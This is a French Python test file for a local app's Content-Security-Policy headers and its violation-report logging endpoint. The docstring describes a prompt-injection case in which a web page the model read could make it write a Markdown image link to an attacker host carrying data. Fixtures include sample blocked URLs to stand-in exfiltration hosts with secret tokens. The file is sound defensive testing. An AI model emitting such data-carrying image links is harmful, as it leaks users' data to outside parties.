#!/usr/bin/env python3
"""CSP : observation (Report-Only), ``img-src`` bloquant, journal des violations.

Contexte : ``core/csp.py``, ``docs/etude-isolation-modules.md`` §3 c1. La CSP
complète est posée en ``Report-Only`` (2026-09-26) ; ``img-src`` seul est
BLOQUANT depuis le 2026-10-18 (décision d'Ilyann, PR #66 : une page web lue
pouvait faire écrire au modèle ``![](https://attaquant/?q=…)``). Verrouille :

  1. ``index.html`` servi par le backend porte ``Content-Security-Policy-Report-Only``
     (politique complète) ET ``Content-Security-Policy`` réduit à
     ``img-src 'self' data: blob:`` — rien d'autre n'est bloquant ;
  2. la copie de ``frontend/vite.config.ts`` (serveur de dev, lancé par le
     tray) est identique à ``core/csp`` pour le backend sur :8000, avec les
     deux mêmes en-têtes ;
  3. le point de collecte accepte les deux formats de rapport SANS token,
     agrège, réduit l'URL bloquée à son origine, borne la taille du corps ;
  4. le journal n'est lisible et vidable qu'avec le token.

Usage :
    python test_csp_observation.py
"""

import json
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import _test_env  # noqa: F401  — isole les chemins AVANT tout import de core.* / main

os.environ["EPURE_ALLOWED_HOSTS"] = "localhost,127.0.0.1,::1"
os.environ.setdefault("HF_HUB_OFFLINE", "1")

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import main  # noqa: E402
from core import csp  # noqa: E402
from core.auth import get_api_token  # noqa: E402

_VITE = Path(__file__).resolve().parent.parent / "frontend" / "vite.config.ts"

_RAPPORT_URI = {"csp-report": {
    "document-uri": "http://localhost:5173/",
    "effective-directive": "connect-src",
    "blocked-uri": "https://exfil.example/collecte?token=secret",
    "source-file": "http://localhost:5173/src/modules/generated/x/Component.tsx",
}}
_RAPPORT_TO = [{"type": "csp-violation", "body": {
    "documentURL": "http://localhost:5173/",
    "effectiveDirective": "connect-src",
    "blockedURL": "https://exfil.example/autre",
}}, {"type": "deprecation", "body": {}}]


def _client() -> TestClient:
    return TestClient(main.app, base_url="http://localhost", client=("127.0.0.1", 54324))


class EnteteIndexTest(unittest.TestCase):
    def setUp(self):
        self._exempt = set(main._WEB_EXEMPT_PATHS)
        self._web = os.environ.get("EPURE_WEB_DIR")
        self._tmp = tempfile.TemporaryDirectory(prefix="epure-test-csp-")
        dist = Path(self._tmp.name)
        (dist / "index.html").write_text("<!doctype html><title>x</title>", encoding="utf-8")
        (dist / "favicon.svg").write_text("<svg/>", encoding="utf-8")
        os.environ["EPURE_WEB_DIR"] = str(dist)

    def tearDown(self):
        main._WEB_EXEMPT_PATHS.clear()
        main._WEB_EXEMPT_PATHS.update(self._exempt)
        if self._web is None:
            os.environ.pop("EPURE_WEB_DIR", None)
        else:
            os.environ["EPURE_WEB_DIR"] = self._web
        self._tmp.cleanup()

    def test_index_report_only_complet_et_img_src_bloquant(self):
        app = FastAPI()
        main._register_web(app)
        with TestClient(app) as c:
            r = c.get("/")
            svg = c.get("/favicon.svg")
        self.assertEqual(r.headers.get("content-security-policy-report-only"), csp.politique())
        self.assertIn("report-uri /csp/report", r.headers["content-security-policy-report-only"])
        # report-uri seul : avec report-to, Chromium ne livrait rien (core/csp.py).
        self.assertNotIn("report-to", r.headers["content-security-policy-report-only"])

        # En-tête BLOQUANT servi, exactement img-src + report-uri : une image
        # distante n'est plus chargée, quelle que soit la façon dont elle est
        # arrivée dans le DOM (Markdown, KaTeX, composant de module).
        bloquant = r.headers.get("content-security-policy")
        self.assertEqual(bloquant, "img-src 'self' data: blob:; report-uri /csp/report")
        self.assertEqual(bloquant, csp.politique_bloquante())
        # Rien d'autre n'est bloquant : connect-src reste en observation.
        self.assertNotIn("connect-src", bloquant)
        self.assertNotIn("content-security-policy", svg.headers)
        self.assertNotIn("content-security-policy-report-only", svg.headers)


class CopieViteTest(unittest.TestCase):
    def test_vite_identique_au_backend_et_en_report_only(self):
        src = _VITE.read_text(encoding="utf-8")
        rapport = re.search(r"const CSP_RAPPORT = '([^']+)'", src).group(1)
        bloc = re.search(r"const CSP_DEV = \[(.*?)\]\.join\('; '\)", src, re.S).group(1)
        parties = [m.group(2) for m in re.finditer(r"""(["'`])(.*?)\1,""", bloc)]
        vite = "; ".join(p.replace("${CSP_RAPPORT}", rapport) for p in parties)
        self.assertEqual(vite, csp.politique(csp.ORIGINES_BACKEND_DEV, rapport=rapport))
        self.assertEqual(rapport, "http://localhost:8000" + csp.CHEMIN_RAPPORT)
        self.assertIn("'Content-Security-Policy-Report-Only': CSP_DEV", src)

    def test_rapport_de_dev_vise_le_backend_en_absolu_sans_proxy(self):
        """En dev, la page est servie par Vite (:5173) et le point de collecte
        vit sur le backend (:8000). Vite n'a AUCUN proxy (`server.proxy`
        absent) : le rapport n'arrive que parce que `report-uri` est ABSOLU
        vers le backend. Un `report-uri /csp/report` relatif, « harmonisé »
        avec la version servie par le backend, partirait vers Vite — 404, et
        journal muet sans erreur visible. Mesuré le 2026-10-18 : 3 rapports
        envoyés, 3 × 204 dans le journal d'accès du backend."""
        src = _VITE.read_text(encoding="utf-8")
        rapport = re.search(r"const CSP_RAPPORT = '([^']+)'", src).group(1)
        origine, _, chemin = rapport.partition("//")[2].partition("/")
        self.assertIn(f"http://{origine}", csp.ORIGINES_BACKEND_DEV)
        self.assertEqual("/" + chemin, csp.CHEMIN_RAPPORT)
        self.assertNotIn("proxy", src, "un proxy changerait le chemin du rapport : revoir ce test")

    def test_vite_img_src_bloquant_identique_au_backend(self):
        src = _VITE.read_text(encoding="utf-8")
        rapport = re.search(r"const CSP_RAPPORT = '([^']+)'", src).group(1)
        bloc = re.search(r"const CSP_DEV_BLOQUANTE = \[(.*?)\]\.join\('; '\)", src, re.S).group(1)
        parties = [m.group(2) for m in re.finditer(r"""(["'`])(.*?)\1,""", bloc)]
        vite = "; ".join(p.replace("${CSP_RAPPORT}", rapport) for p in parties)
        self.assertEqual(vite, csp.politique_bloquante(rapport=rapport))
        self.assertRegex(src, r"'Content-Security-Policy'\s*:\s*CSP_DEV_BLOQUANTE")


class CollecteTest(unittest.TestCase):
    def setUp(self):
        csp.vider()
        self.addCleanup(csp.vider)
        self.c = _client()
        self.auth = {"Authorization": f"Bearer {get_api_token()}"}

    def _poster(self, corps, type_="application/csp-report"):
        return self.c.post(csp.CHEMIN_RAPPORT, content=corps if isinstance(corps, bytes)
                           else json.dumps(corps), headers={"Content-Type": type_})

    def test_deux_formats_sans_token_agreges_et_reduits_a_l_origine(self):
        self.assertEqual(self._poster(_RAPPORT_URI).status_code, 204)
        self.assertEqual(self._poster(_RAPPORT_URI).status_code, 204)
        self.assertEqual(self._poster(_RAPPORT_TO, "application/reports+json").status_code, 204)

        r = self.c.get("/instance/csp", headers=self.auth)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["mode"], "report-only")
        entrees = r.json()["entrées"]
        self.assertEqual(len(entrees), 1, entrees)  # même directive × origine × page
        e = entrees[0]
        self.assertEqual((e["directive"], e["bloqué"], e["nombre"]),
                         ("connect-src", "https://exfil.example", 3))
        self.assertNotIn("secret", json.dumps(r.json()))

    def test_rapport_reel_du_navigateur_ecrit_dans_le_journal(self):
        """Corps EXACT capturé le 2026-10-18 depuis Edge 155 (CDP) sur le
        serveur de dev : image distante bloquée par l'en-tête img-src. Envoyé
        comme le navigateur l'envoie — `application/csp-report`, sans token,
        depuis la page de dev (autre origine que :8000) — et vérifié jusqu'au
        FICHIER journal, pas seulement au statut. C'est la chaîne prouvée de
        bout en bout ce jour-là ; un 422 sur ce Content-Type, un middleware
        qui exigerait le token ou un hôte refusé rendraient le journal muet
        sans qu'aucun autre test ne le voie."""
        corps = (
            b'{"csp-report":{"document-uri":"http://127.0.0.1:5173/","referrer":"",'
            b'"violated-directive":"img-src","effective-directive":"img-src",'
            b'"original-policy":"img-src \'self\' data: blob:; report-uri http://localhost:8000/csp/report",'
            b'"disposition":"enforce","blocked-uri":"https://exemple.invalid/sonde-img.png?q=secret",'
            b'"status-code":200,"script-sample":""}}'
        )
        r = self.c.post(csp.CHEMIN_RAPPORT, content=corps, headers={
            "Content-Type": "application/csp-report",
            "Origin": "http://127.0.0.1:5173",
        })
        self.assertEqual(r.status_code, 204)

        sur_disque = json.loads(csp._journal().read_text(encoding="utf-8"))
        entrees = list(sur_disque["entrées"].values())
        self.assertEqual(len(entrees), 1)
        self.assertEqual(
            (entrees[0]["directive"], entrees[0]["bloqué"], entrees[0]["document"], entrees[0]["nombre"]),
            ("img-src", "https://exemple.invalid", "http://127.0.0.1:5173", 1),
        )
        # Réduit à l'origine : le paramètre de l'URL bloquée n'est pas conservé.
        self.assertNotIn("secret", json.dumps(sur_disque))

    def test_corps_borne_et_json_invalide(self):
        self.assertEqual(self._poster(b"x" * (csp.TAILLE_MAX + 1)).status_code, 413)
        self.assertEqual(self._poster(b"{pas du json").status_code, 400)
        self.assertEqual(csp.lire(), [])

    def test_journal_exige_le_token(self):
        self.assertEqual(self.c.get("/instance/csp").status_code, 401)
        self.assertEqual(self.c.delete("/instance/csp").status_code, 401)
        self._poster(_RAPPORT_URI)
        self.assertEqual(self.c.delete("/instance/csp", headers=self.auth).status_code, 200)
        self.assertEqual(csp.lire(), [])

    def test_nombre_d_entrees_borne(self):
        # Un seul envoi groupé (format report-to) : une transaction, pas 205.
        csp.enregistrer([{"type": "csp-violation", "body": {
            "effectiveDirective": "img-src", "blockedURL": f"https://h{i}.example/",
            "documentURL": "http://localhost:5173/"}} for i in range(csp.ENTREES_MAX + 5)])
        self.assertEqual(len(csp.lire()), csp.ENTREES_MAX)


if __name__ == "__main__":
    unittest.main()
